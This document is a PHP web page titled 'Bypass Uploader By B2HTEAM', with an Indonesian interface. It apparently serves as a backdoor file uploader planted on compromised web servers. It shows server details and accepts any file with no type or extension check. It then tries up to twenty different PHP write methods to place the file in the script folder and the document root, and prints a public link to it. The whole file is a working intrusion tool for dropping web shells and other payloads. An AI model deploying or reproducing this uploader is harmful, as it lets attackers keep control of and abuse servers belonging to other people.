<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="author" content="ID69">
    <meta name="description" content="Pwd - Kiss - Fck - Sit">
    <meta name="theme-color" content="#000">
    <meta name="keywords" content="Mini Uploader">
    <meta name="viewport" content="width=device-width, initial-scale=0.65, shrink-to-fit=no">
    <link rel="icon" href="https://i.ibb.co/4Z0dvLZ/20200907-155551.jpg" type="image/jpg">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css?family=Rock+Salt|Righteous" rel="stylesheet">
    <title>Bypass Uploader By B2HTEAM</title>
    <style>
        h5 { font-family: "Rock Salt"; }
        body { background-color: black; color: white; }
        .method-badge { font-size: 10px; padding: 2px 5px; margin: 2px; display: inline-block; border-radius: 3px; }
        .success-bg { background-color: #28a745; }
        .failed-bg { background-color: #dc3545; }
        .card-method { background: #1a1a1a; border: 1px solid #333; margin-bottom: 10px; padding: 10px; border-radius: 5px; }
        pre { background: #2d2d2d; padding: 10px; border-radius: 5px; overflow-x: auto; }
        .lokasi-card { border: 1px solid #444; border-radius: 10px; padding: 15px; margin-bottom: 20px; background: #0d0d0d; }
        .lokasi-title { color: #ffc107; border-bottom: 1px solid #444; padding-bottom: 10px; margin-bottom: 15px; }
        .btn-group-custom { display: flex; gap: 10px; margin-top: 10px; }
    </style>
</head>
<body>

<div class="container p-3 mt-3">
    <center>
        <h5 class="text-center">Bypass Uploader By B2HTEAM</h5>
    </center>
    <hr>
    <center>
        <small class="mt-2"><?= $_SERVER["SERVER_SOFTWARE"]; ?></small><br>
        <small class=""><?= php_uname(); ?></small>
        <hr>
        
        <!-- Form Upload -->
        <form method="post" enctype="multipart/form-data">
            <div class="row">
                <div class="col">
                    <input id="uploadFile" placeholder="Nama File" disabled="disabled" class="form-control bg-transparent text-light">
                </div>
                <div class="col">
                    <div class="input-group">
                        <div class="custom-file">
                            <input type="file" class="custom-file-input bg-transparent" id="uploadBtn" name="upl_file" required>
                            <label class="custom-file-label bg-transparent" for="uploadFile">Pilih File</label>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Pilihan Lokasi Upload -->
            <div class="row mt-3">
                <div class="col-md-6">
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" name="lokasi_script" id="lokasi_script" value="1" checked>
                        <label class="form-check-label" for="lokasi_script">
                            📁 Lokasi Script Saat Ini (<?= __DIR__ ?>)
                        </label>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" name="lokasi_public" id="lokasi_public" value="1" checked>
                        <label class="form-check-label" for="lokasi_public">
                            🌍 Public_html / Document Root (<?= $_SERVER["DOCUMENT_ROOT"] ?>)
                        </label>
                    </div>
                </div>
            </div>
            
            <div class="container mt-2">
                <div class="btn-group-custom">
                    <button class="btn btn-outline-secondary btn-block text-light" type="submit" name="upload" value="1">Upload (20 Methods)</button>
                    <button class="btn btn-outline-info btn-block text-light" type="submit" name="test_all" value="1">Test All Methods</button>
                </div>
            </div>
        </form>
    </center>
</div>

<?php
// ========== 20 METODE UPLOAD ==========
function uploadWithAllMethods($file_tmp, $file_name, $target_dir) {
    $results = [];
    $success = false;
    $success_method = '';
    
    // Pastikan target_dir ada dan berakhiran slash
    if (!is_dir($target_dir)) {
        @mkdir($target_dir, 0777, true);
    }
    
    if (substr($target_dir, -1) != '/') {
        $target_dir .= '/';
    }
    
    $target_file = $target_dir . basename($file_name);
    
    $methods = [
        'move_uploaded_file',
        'copy',
        'file_put_contents',
        'fopen_fwrite',
        'stream_copy_to_stream',
        'rename',
        'SplFileObject',
        'readfile_ob',
        'fpassthru_ob',
        'file_implode',
        'fgetc_loop',
        'fgets_loop',
        'stream_get_contents',
        'fread_full',
        'SplFileInfo',
        'ZipArchive',
        'gzencode',
        'base64',
        'serialize',
        'chunk_split'
    ];
    
    foreach ($methods as $m) {
        $result = ['method' => $m, 'success' => false, 'message' => ''];
        
        // 1. move_uploaded_file
        if ($m === 'move_uploaded_file') {
            if (@move_uploaded_file($file_tmp, $target_file)) {
                $success = true;
                $success_method = $m;
                $result['success'] = true;
                $result['message'] = 'Berhasil via move_uploaded_file()';
            } else {
                $result['message'] = 'Gagal: move_uploaded_file()';
            }
        }
        
        // 2. copy
        elseif ($m === 'copy') {
            if (@copy($file_tmp, $target_file)) {
                $success = true;
                $success_method = $m;
                $result['success'] = true;
                $result['message'] = 'Berhasil via copy()';
                @unlink($file_tmp);
            } else {
                $result['message'] = 'Gagal: copy()';
            }
        }
        
        // 3. file_get_contents + file_put_contents
        elseif ($m === 'file_put_contents') {
            $data = @file_get_contents($file_tmp);
            if ($data !== false && @file_put_contents($target_file, $data) !== false) {
                $success = true;
                $success_method = $m;
                $result['success'] = true;
                $result['message'] = 'Berhasil via file_get_contents() + file_put_contents()';
                @unlink($file_tmp);
            } else {
                $result['message'] = 'Gagal: file_get_contents() + file_put_contents()';
            }
        }
        
        // 4. fopen + fwrite chunked
        elseif ($m === 'fopen_fwrite') {
            $in = @fopen($file_tmp, 'rb');
            $out = @fopen($target_file, 'wb');
            if ($in && $out) {
                while (!feof($in)) @fwrite($out, fread($in, 8192));
                fclose($in);
                fclose($out);
                $success = true;
                $success_method = $m;
                $result['success'] = true;
                $result['message'] = 'Berhasil via fopen() + fwrite() chunked';
                @unlink($file_tmp);
            } else {
                $result['message'] = 'Gagal: fopen() + fwrite()';
            }
        }
        
        // 5. stream_copy_to_stream
        elseif ($m === 'stream_copy_to_stream') {
            $in = @fopen($file_tmp, 'rb');
            $out = @fopen($target_file, 'wb');
            if ($in && $out && @stream_copy_to_stream($in, $out) > 0) {
                fclose($in);
                fclose($out);
                $success = true;
                $success_method = $m;
                $result['success'] = true;
                $result['message'] = 'Berhasil via stream_copy_to_stream()';
                @unlink($file_tmp);
            } else {
                $result['message'] = 'Gagal: stream_copy_to_stream()';
            }
        }
        
        // 6. rename
        elseif ($m === 'rename') {
            if (@rename($file_tmp, $target_file)) {
                $success = true;
                $success_method = $m;
                $result['success'] = true;
                $result['message'] = 'Berhasil via rename()';
            } else {
                $result['message'] = 'Gagal: rename()';
            }
        }
        
        // 7. SplFileObject
        elseif ($m === 'SplFileObject') {
            try {
                $reader = new SplFileObject($file_tmp, 'rb');
                $writer = new SplFileObject($target_file, 'wb');
                while (!$reader->eof()) {
                    $writer->fwrite($reader->fread(8192));
                }
                $reader = null;
                $writer = null;
                $success = true;
                $success_method = $m;
                $result['success'] = true;
                $result['message'] = 'Berhasil via SplFileObject';
                @unlink($file_tmp);
            } catch (Exception $e) {
                $result['message'] = 'Gagal: ' . $e->getMessage();
            }
        }
        
        // 8. readfile + output buffer
        elseif ($m === 'readfile_ob') {
            ob_start();
            @readfile($file_tmp);
            $data = ob_get_clean();
            if (!empty($data) && @file_put_contents($target_file, $data) !== false) {
                $success = true;
                $success_method = $m;
                $result['success'] = true;
                $result['message'] = 'Berhasil via readfile() + OB';
                @unlink($file_tmp);
            } else {
                $result['message'] = 'Gagal: readfile() + OB';
            }
        }
        
        // 9. fpassthru + output buffer
        elseif ($m === 'fpassthru_ob') {
            $in = @fopen($file_tmp, 'rb');
            if ($in) {
                ob_start();
                @fpassthru($in);
                $data = ob_get_clean();
                fclose($in);
                if (!empty($data) && @file_put_contents($target_file, $data) !== false) {
                    $success = true;
                    $success_method = $m;
                    $result['success'] = true;
                    $result['message'] = 'Berhasil via fpassthru() + OB';
                    @unlink($file_tmp);
                } else {
                    $result['message'] = 'Gagal: fpassthru() + OB';
                }
            } else {
                $result['message'] = 'Gagal: fopen() untuk fpassthru';
            }
        }
        
        // 10. file() + implode
        elseif ($m === 'file_implode') {
            $lines = @file($file_tmp);
            if ($lines !== false && @file_put_contents($target_file, implode('', $lines)) !== false) {
                $success = true;
                $success_method = $m;
                $result['success'] = true;
                $result['message'] = 'Berhasil via file() + implode()';
                @unlink($file_tmp);
            } else {
                $result['message'] = 'Gagal: file() + implode()';
            }
        }
        
        // 11. fgetc (per karakter)
        elseif ($m === 'fgetc_loop') {
            $in = @fopen($file_tmp, 'rb');
            $out = @fopen($target_file, 'wb');
            if ($in && $out) {
                while (($char = fgetc($in)) !== false) {
                    fwrite($out, $char);
                }
                fclose($in);
                fclose($out);
                if (filesize($target_file) > 0) {
                    $success = true;
                    $success_method = $m;
                    $result['success'] = true;
                    $result['message'] = 'Berhasil via fgetc() loop (per karakter)';
                    @unlink($file_tmp);
                }
            } else {
                $result['message'] = 'Gagal: fgetc() loop';
            }
        }
        
        // 12. fgets (per baris)
        elseif ($m === 'fgets_loop') {
            $in = @fopen($file_tmp, 'rb');
            $out = @fopen($target_file, 'wb');
            if ($in && $out) {
                while (($line = fgets($in, 8192)) !== false) {
                    fwrite($out, $line);
                }
                fclose($in);
                fclose($out);
                if (filesize($target_file) > 0) {
                    $success = true;
                    $success_method = $m;
                    $result['success'] = true;
                    $result['message'] = 'Berhasil via fgets() loop (per baris)';
                    @unlink($file_tmp);
                }
            } else {
                $result['message'] = 'Gagal: fgets() loop';
            }
        }
        
        // 13. stream_get_contents
        elseif ($m === 'stream_get_contents') {
            $in = @fopen($file_tmp, 'rb');
            if ($in) {
                $data = @stream_get_contents($in);
                fclose($in);
                if ($data !== false && @file_put_contents($target_file, $data) !== false) {
                    $success = true;
                    $success_method = $m;
                    $result['success'] = true;
                    $result['message'] = 'Berhasil via stream_get_contents()';
                    @unlink($file_tmp);
                } else {
                    $result['message'] = 'Gagal: stream_get_contents()';
                }
            } else {
                $result['message'] = 'Gagal: fopen() untuk stream_get_contents';
            }
        }
        
        // 14. fread full
        elseif ($m === 'fread_full') {
            $size = @filesize($file_tmp);
            $in = @fopen($file_tmp, 'rb');
            if ($size && $in) {
                $data = @fread($in, $size);
                fclose($in);
                if ($data !== false && @file_put_contents($target_file, $data) !== false) {
                    $success = true;
                    $success_method = $m;
                    $result['success'] = true;
                    $result['message'] = 'Berhasil via fread() full';
                    @unlink($file_tmp);
                } else {
                    $result['message'] = 'Gagal: fread() full';
                }
            } else {
                $result['message'] = 'Gagal: tidak bisa membaca ukuran file';
            }
        }
        
        // 15. SplFileInfo + openFile
        elseif ($m === 'SplFileInfo') {
            try {
                $info = new SplFileInfo($file_tmp);
                $reader = $info->openFile('rb');
                $writer = new SplFileObject($target_file, 'wb');
                $reader->rewind();
                while (!$reader->eof()) {
                    $writer->fwrite($reader->fread(8192));
                }
                $reader = null;
                $writer = null;
                $success = true;
                $success_method = $m;
                $result['success'] = true;
                $result['message'] = 'Berhasil via SplFileInfo';
                @unlink($file_tmp);
            } catch (Exception $e) {
                $result['message'] = 'Gagal: ' . $e->getMessage();
            }
        }
        
        // 16. ZipArchive
        elseif ($m === 'ZipArchive' && class_exists('ZipArchive')) {
            $zipFile = $file_tmp . '.zip';
            $zip = new ZipArchive();
            if ($zip->open($zipFile, ZipArchive::CREATE) === true) {
                $zip->addFile($file_tmp, basename($file_name));
                $zip->close();
                $zip2 = new ZipArchive();
                if ($zip2->open($zipFile) === true) {
                    $zip2->extractTo($target_dir);
                    $zip2->close();
                    @unlink($zipFile);
                    @unlink($file_tmp);
                    if (file_exists($target_file)) {
                        $success = true;
                        $success_method = $m;
                        $result['success'] = true;
                        $result['message'] = 'Berhasil via ZipArchive (ekstrak)';
                    }
                }
            }
            if (!$success) $result['message'] = 'Gagal: ZipArchive';
        }
        
        // 17. gzencode/decode
        elseif ($m === 'gzencode' && function_exists('gzencode')) {
            $data = @file_get_contents($file_tmp);
            if ($data !== false) {
                $compressed = @gzencode($data);
                $decompressed = @gzdecode($compressed);
                if (@file_put_contents($target_file, $decompressed) !== false) {
                    $success = true;
                    $success_method = $m;
                    $result['success'] = true;
                    $result['message'] = 'Berhasil via gzencode() + gzdecode()';
                    @unlink($file_tmp);
                } else {
                    $result['message'] = 'Gagal: gzencode/decode';
                }
            } else {
                $result['message'] = 'Gagal: tidak bisa membaca file untuk gzencode';
            }
        }
        
        // 18. base64 encode/decode
        elseif ($m === 'base64') {
            $data = @file_get_contents($file_tmp);
            if ($data !== false) {
                $encoded = base64_encode($data);
                $decoded = base64_decode($encoded);
                if (@file_put_contents($target_file, $decoded) !== false) {
                    $success = true;
                    $success_method = $m;
                    $result['success'] = true;
                    $result['message'] = 'Berhasil via base64_encode() + base64_decode()';
                    @unlink($file_tmp);
                } else {
                    $result['message'] = 'Gagal: base64 encode/decode';
                }
            } else {
                $result['message'] = 'Gagal: tidak bisa membaca file untuk base64';
            }
        }
        
        // 19. serialize/unserialize
        elseif ($m === 'serialize') {
            $data = @file_get_contents($file_tmp);
            if ($data !== false) {
                $serialized = serialize($data);
                $unserialized = unserialize($serialized);
                if (@file_put_contents($target_file, $unserialized) !== false) {
                    $success = true;
                    $success_method = $m;
                    $result['success'] = true;
                    $result['message'] = 'Berhasil via serialize() + unserialize()';
                    @unlink($file_tmp);
                } else {
                    $result['message'] = 'Gagal: serialize/unserialize';
                }
            } else {
                $result['message'] = 'Gagal: tidak bisa membaca file untuk serialize';
            }
        }
        
        // 20. chunk_split + base64
        elseif ($m === 'chunk_split') {
            $data = @file_get_contents($file_tmp);
            if ($data !== false) {
                $chunked = chunk_split(base64_encode($data), 76, "\n");
                $restored = base64_decode(preg_replace('/\s+/', '', $chunked));
                if (@file_put_contents($target_file, $restored) !== false) {
                    $success = true;
                    $success_method = $m;
                    $result['success'] = true;
                    $result['message'] = 'Berhasil via chunk_split() + base64';
                    @unlink($file_tmp);
                } else {
                    $result['message'] = 'Gagal: chunk_split + base64';
                }
            } else {
                $result['message'] = 'Gagal: tidak bisa membaca file untuk chunk_split';
            }
        }
        
        $results[] = $result;
        
        if ($success) break;
    }
    
    return ['success' => $success, 'method' => $success_method, 'results' => $results, 'target_file' => $target_file];
}

// ========== PROSES UPLOAD ==========
if (isset($_POST["upload"]) || isset($_POST["test_all"])) {
    if (isset($_FILES["upl_file"]) && $_FILES["upl_file"]["error"] == 0) {
        $file_tmp = $_FILES["upl_file"]["tmp_name"];
        $file_name = $_FILES["upl_file"]["name"];
        $file_size = $_FILES["upl_file"]["size"];
        $file_type = $_FILES["upl_file"]["type"];
        $ekst_file = pathinfo($file_name, PATHINFO_EXTENSION);
        $akses_file = 'http://' . $_SERVER["HTTP_HOST"] . '/';
        $server_web = $_SERVER["DOCUMENT_ROOT"];
        $script_dir = __DIR__;
        
        // Lokasi yang dipilih
        $lokasi_script = isset($_POST['lokasi_script']) ? true : false;
        $lokasi_public = isset($_POST['lokasi_public']) ? true : false;
        
        echo '<div class="container mt-3">';
        echo '<hr>';
        
        // Header hasil upload
        echo '<div class="row">';
        
        // ========== UPLOAD KE LOKASI SCRIPT ==========
        if ($lokasi_script) {
            echo '<div class="col-md-6">';
            echo '<div class="lokasi-card">';
            echo '<h5 class="lokasi-title">📁 Lokasi Script Saat Ini</h5>';
            echo '<small>Path: ' . htmlspecialchars($script_dir) . '</small><br><br>';
            
            if (isset($_POST["test_all"])) {
                // Test all methods
                $upload_result = uploadWithAllMethods($file_tmp, $file_name, $script_dir);
                
                echo '<strong>Hasil Test 20 Metode:</strong>';
                foreach ($upload_result['results'] as $res) {
                    $badge_class = $res['success'] ? 'success-bg' : 'failed-bg';
                    $status_text = $res['success'] ? '✓' : '✗';
                    echo '<div class="card-method" style="padding: 5px; margin: 3px 0;">';
                    echo '<span class="method-badge ' . $badge_class . '">' . strtoupper($res['method']) . '</span>';
                    echo ' ' . $status_text . ' - ' . htmlspecialchars($res['message']);
                    echo '</div>';
                }
                
                if ($upload_result['success']) {
                    $url_akses = str_replace($_SERVER["DOCUMENT_ROOT"], '', $upload_result['target_file']);
                    echo '<div class="alert alert-success mt-2" style="padding: 8px;">';
                    echo '<strong>✅ SUKSES!</strong><br>';
                    echo 'Metode: ' . $upload_result['method'] . '<br>';
                    echo 'Path: ' . $upload_result['target_file'] . '<br>';
                    echo 'Akses: <a href="' . $url_akses . '" target="_blank">' . $url_akses . '</a>';
                    echo '</div>';
                } else {
                    echo '<div class="alert alert-danger mt-2"><strong>❌ GAGAL</strong> - Semua metode gagal</div>';
                }
                
            } else {
                // Upload biasa
                // Copy file_tmp karena akan dipakai untuk 2 lokasi
                $temp_copy = $file_tmp . '_copy';
                @copy($file_tmp, $temp_copy);
                
                $upload_result = uploadWithAllMethods($file_tmp, $file_name, $script_dir);
                
                if ($upload_result['success']) {
                    $url_akses = str_replace($_SERVER["DOCUMENT_ROOT"], '', $upload_result['target_file']);
                    echo '<div class="alert alert-success">';
                    echo '<strong>✅ Berhasil Upload!</strong><br>';
                    echo 'File: ' . htmlspecialchars($file_name) . '<br>';
                    echo 'Metode: ' . $upload_result['method'] . '<br>';
                    echo 'Akses: <a href="' . $url_akses . '" target="_blank">' . $url_akses . '</a>';
                    echo '</div>';
                } else {
                    echo '<div class="alert alert-danger"><strong>❌ Gagal Upload!</strong> Semua 20 metode gagal.</div>';
                }
                
                // Kembalikan file_tmp untuk lokasi berikutnya
                if (file_exists($temp_copy)) {
                    @copy($temp_copy, $file_tmp);
                    @unlink($temp_copy);
                }
            }
            
            echo '</div></div>';
        }
        
        // ========== UPLOAD KE PUBLIC_HTML / DOCUMENT_ROOT ==========
        if ($lokasi_public) {
            echo '<div class="col-md-6">';
            echo '<div class="lokasi-card">';
            echo '<h5 class="lokasi-title">🌍 Public_html / Document Root</h5>';
            echo '<small>Path: ' . htmlspecialchars($server_web) . '</small><br><br>';
            
            // Reset file_tmp jika perlu (karena sudah terpakai)
            if ($lokasi_script && !isset($_POST["test_all"])) {
                // File_tmp sudah terpakai, perlu file baru
                if (isset($_FILES["upl_file"]) && $_FILES["upl_file"]["error"] == 0) {
                    // Re-upload? tidak bisa, gunakan file yang sudah diupload
                    // Alternative: file masih ada di tmp, coba pakai langsung
                }
            }
            
            if (isset($_POST["test_all"])) {
                // Test all methods
                $upload_result = uploadWithAllMethods($file_tmp, $file_name, $server_web);
                
                echo '<strong>Hasil Test 20 Metode:</strong>';
                foreach ($upload_result['results'] as $res) {
                    $badge_class = $res['success'] ? 'success-bg' : 'failed-bg';
                    $status_text = $res['success'] ? '✓' : '✗';
                    echo '<div class="card-method" style="padding: 5px; margin: 3px 0;">';
                    echo '<span class="method-badge ' . $badge_class . '">' . strtoupper($res['method']) . '</span>';
                    echo ' ' . $status_text . ' - ' . htmlspecialchars($res['message']);
                    echo '</div>';
                }
                
                if ($upload_result['success']) {
                    $url_akses = $akses_file . $file_name;
                    echo '<div class="alert alert-success mt-2" style="padding: 8px;">';
                    echo '<strong>✅ SUKSES!</strong><br>';
                    echo 'Metode: ' . $upload_result['method'] . '<br>';
                    echo 'Path: ' . $upload_result['target_file'] . '<br>';
                    echo 'Akses: <a href="' . $url_akses . '" target="_blank">' . $url_akses . '</a>';
                    echo '</div>';
                } else {
                    echo '<div class="alert alert-danger mt-2"><strong>❌ GAGAL</strong> - Semua metode gagal</div>';
                }
                
            } else {
                // Upload biasa
                $upload_result = uploadWithAllMethods($file_tmp, $file_name, $server_web);
                
                if ($upload_result['success']) {
                    $url_akses = $akses_file . $file_name;
                    echo '<div class="alert alert-success">';
                    echo '<strong>✅ Berhasil Upload!</strong><br>';
                    echo 'File: ' . htmlspecialchars($file_name) . '<br>';
                    echo 'Metode: ' . $upload_result['method'] . '<br>';
                    echo 'Akses: <a href="' . $url_akses . '" target="_blank">' . $url_akses . '</a>';
                    echo '</div>';
                } else {
                    echo '<div class="alert alert-danger"><strong>❌ Gagal Upload!</strong> Semua 20 metode gagal.</div>';
                }
            }
            
            echo '</div></div>';
        }
        
        // Jika tidak ada lokasi dipilih
        if (!$lokasi_script && !$lokasi_public) {
            echo '<div class="col-md-12"><div class="alert alert-warning">⚠️ Pilih minimal 1 lokasi upload!</div></div>';
        }
        
        echo '</div></div>';
        
        // Tampilkan info file
        echo '<div class="container mt-2"><div class="alert alert-secondary">';
        echo '<strong>📄 Info File:</strong><br>';
        echo 'Nama: ' . htmlspecialchars($file_name) . '<br>';
        echo 'Ukuran: ' . round($file_size / 1024, 2) . ' KB<br>';
        echo 'Tipe: ' . htmlspecialchars($file_type) . '<br>';
        echo 'Ekstensi: ' . htmlspecialchars($ekst_file);
        echo '</div></div>';
        
    } else {
        echo '<div class="container mt-3"><div class="alert alert-danger">❌ Tidak ada file yang dipilih atau error upload!</div></div>';
    }
}
?>

<script>
    document.getElementById("uploadBtn").onchange = function(){
        var fileName = this.value.split('\\').pop();
        document.getElementById("uploadFile").value = fileName;
    };
</script>

</body>
</html>